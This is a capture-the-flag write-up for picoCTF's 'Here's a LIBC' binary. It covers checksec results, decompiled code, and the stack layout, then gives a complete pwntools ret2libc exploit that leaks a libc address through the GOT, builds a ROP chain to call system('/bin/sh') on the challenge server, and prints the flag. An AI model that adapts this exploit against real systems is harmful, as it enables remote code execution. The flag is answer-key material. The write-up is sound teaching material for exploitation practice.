So they provice us two things: binary file and a libc file.

Hint: PWNTools has a lot of useful features for getting offsets.

First thing first we gonna patch the libc file into binary file by using pwninit
![image](https://user-images.githubusercontent.com/114044703/218262859-f0c0d4b8-26bf-46f9-9a03-152b5aaef5a8.png)

Let's take a look at the binary:

```
┌──(kali㉿kali)-[~/Downloads/pico/Here's a LIBC]
└─$ file vuln_patched
vuln_patched: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.27.so, for GNU/Linux 3.2.0, BuildID[sha1]=e5dba3e6ed29e457cd104accb279e127285eecd0, not stripped
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads/pico/Here's a LIBC]
└─$ pwn checksec vuln_patched
/usr/lib/python3/dist-packages/pkg_resources/__init__.py:123: PkgResourcesDeprecationWarning: 2.3.0-nmu1-b1 is an invalid version and will not be supported in a future release
  warnings.warn(
[*] "/home/kali/Downloads/pico/Here's a LIBC/vuln_patched"
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads/pico/Here's a LIBC]
└─$ ./vuln_patched
WeLcOmE To mY EcHo sErVeR!
asdf
AsDf
as
As
```

So we can see that it is `64` bit without RELRO, a NON-Excutable Stack and no PIE. We can see that when we run the binary. It allow us for input, and print out the text we have type in with the change of uppercase or lowercase.When we take a look at the main function in Ghidra we see this:

```
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  void *v3; // rsp
  char v4; // al
  char *v5; // rdi
  const char **v6; // [rsp+0h] [rbp-80h] BYREF
  int v7; // [rsp+Ch] [rbp-74h]
  char v8[40]; // [rsp+10h] [rbp-70h] BYREF
  char *s; // [rsp+38h] [rbp-48h]
  __int64 v10; // [rsp+40h] [rbp-40h]
  unsigned __int64 v11; // [rsp+48h] [rbp-38h]
  __gid_t rgid; // [rsp+54h] [rbp-2Ch]
  unsigned __int64 i; // [rsp+58h] [rbp-28h]

  v7 = argc;
  v6 = argv;
  setbuf(_bss_start, 0LL);
  rgid = getegid();
  setresgid(rgid, rgid, rgid);
  v11 = 27LL;
  strcpy(v8, "Welcome to my echo server!");
  v10 = 26LL;
  v3 = alloca(32LL);
  s = (char *)&v6;
  for ( i = 0LL; i < v11; ++i )
  {
    v4 = convert_case((unsigned int)v8[i], i);
    s[i] = v4;
  }
  v5 = s;
  puts(s);
  while ( 1 )
    do_stuff(v5);
}
```

At the start, the program do nothing much, It just printting out wellcome text with random character been turn to uppercase. We gonna work with func `do_stuff`:

```
int do_stuff()
{
  char v0; // al
  char v2; // [rsp+Fh] [rbp-81h] BYREF
  char s[112]; // [rsp+10h] [rbp-80h] BYREF
  __int64 v4; // [rsp+80h] [rbp-10h]
  unsigned __int64 i; // [rsp+88h] [rbp-8h]

  v4 = 0LL;
  __isoc99_scanf("%[^\n]", input);
  __isoc99_scanf("%c", &v2);
  for ( i = 0LL; i <= 0x63; ++i )
  {
    v0 = convert_case((unsigned int)input[i], i);
    input[i] = v0;
  }
  return puts(input);
}
```

So the first `scanf` will take input from user until it see new line character or `\n`. The second scanf will take the new line character from above. So that we not gonna care about when to use sendline or send anymore.

When checking with ghidra we will see that `input` have buffer over flow vulnerable because it has the size of `112` but the first scanf has no limit the size from user.

**BrainStormming**

- We have known that program have buffer over flow vulnerable, have no win func and `NX` is turn on so we can't do the ret2shellcode or ret2win.
- Chanlenge provide us a libc file so that we have known the libc version of sever, we can do ret2libc or easier we can do ROP if program has enough gadget.

**Leaking**

Look at the stack layout in ghidra:

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined __stdcall do_stuff(void)
             undefined         AL:1           <RETURN>
             undefined8        Stack[-0x10]:8 local_10                                XREF[6]:     0040071e(W), 
                                                                                                   0040072c(R), 
                                                                                                   00400739(R), 
                                                                                                   0040074d(R), 
                                                                                                   00400756(RW), 
                                                                                                   0040075b(R)  
             undefined8        Stack[-0x18]:8 local_18                                XREF[1]:     004006e3(W)  
             undefined1[112]   Stack[-0x88]   input                                   XREF[4]:     004006eb(*), 
                                                                                                   00400728(*), 
                                                                                                   00400749(*), 
                                                                                                   00400762(*)  
             undefined1        Stack[-0x89]:1 local_89                                XREF[1]:     00400703(*)  
                             do_stuff                                        XREF[4]:     Entry Point(*), main:0040089b(c), 
                                                                                          0040096c, 00400a38(*)  
        004006d8 55              PUSH       RBP
```

- `input` wil reach `save RIP` when offset is `0x88` 
- We use puts.plt func to print out got address(puts can't be use because it have been call). Right here i'll use got setbuff.

```
from pwn import *


exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")

context.binary = exe
padding=b"A"*0x88

rdi=0x0000000000400913
plt=exe.plt["puts"]
got=0x601028    #setbuff
main=exe.symbols["main"]

t=process("./vuln_patched")
gdb.attach(t,api=True)

payload=flat(
	padding,
	p64(rdi),p64(got),
	p64(plt),
	p64(main),
)

t.recv()
t.sendline(payload)
leak=t.recvuntil(b"!")

leak=leak.split(b"\n")[2].ljust(8,b"\x00")
leak=u64(leak)
```

Find out needed address

```
set_buff_offset=0x88540
libc_base=leak-set_buff_offset
system=libc_base+0x000000000004f4e0
ret=0x000000000040052e  #Binary
bin_sh=libc_base+next(libc.search(b"/bin/sh"))   #search is find out the strings and next is find the addr off it
```

 Putting it all together we get the following exploit:
 
 ```
 from pwn import *


exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")

context.binary = exe
padding=b"A"*0x88

rdi=0x0000000000400913
plt=exe.plt["puts"]
got=0x601028    #setbuff
main=exe.symbols["main"]

t=remote(b"mercury.picoctf.net",1774)
#t=process("./vuln_patched")
#gdb.attach(t,api=True)

payload=flat(
	padding,
	p64(rdi),p64(got),
	p64(plt),
	p64(main),
)

t.recv()
t.sendline(payload)
leak=t.recvuntil(b"!")

leak=leak.split(b"\n")[2].ljust(8,b"\x00")
leak=u64(leak)
set_buff_offset=0x88540
libc_base=leak-set_buff_offset
system=libc_base+0x000000000004f4e0
ret=0x000000000040052e
bin_sh=libc_base+next(libc.search(b"/bin/sh")) #Search is find out the strings and next is find the addr off it

log.success("***Successfull leak address***")
log.info("Setbuff addres :"+hex(leak))
log.info("Libc base address :"+hex(libc_base))
log.info("bin/sh addres :"+hex(bin_sh))


payload=flat(
	padding,
	p64(rdi),p64(bin_sh),
	p64(ret),         #**Note**: When don't have xmm0 register the stack address need to be end with 8 when doing syscall
	p64(system)
	)
t.sendline(payload)

t.interactive()

 ```
 
 When we run it:
 
 ![image](https://user-images.githubusercontent.com/114044703/218268583-990c512e-c0c7-4077-99b2-fb1910ac2917.png)
 
 Flag: `picoCTF{1_<3_sm4sh_st4cking_f2ac531bbb3a68ed}`

 




